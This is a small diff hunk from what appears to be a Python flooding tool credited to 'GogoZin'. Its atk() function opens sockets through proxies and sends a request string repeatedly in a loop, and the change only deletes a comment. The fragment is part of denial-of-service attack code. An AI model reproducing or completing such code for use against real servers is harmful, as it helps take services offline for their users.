@@ -154,7 +154,7 @@ def atk():
 		while on:
 			try:
 				s = socket.socket()
-				s.connect((str(proxy[0]), int(proxy[1]))) #Here should be this :)
+				s.connect((str(proxy[0]), int(proxy[1]))) 
 				s.send(str.encode(rqs))
 				try:
 					for i in range(times):                                                          #Code By GogoZin, Improved By L330n123
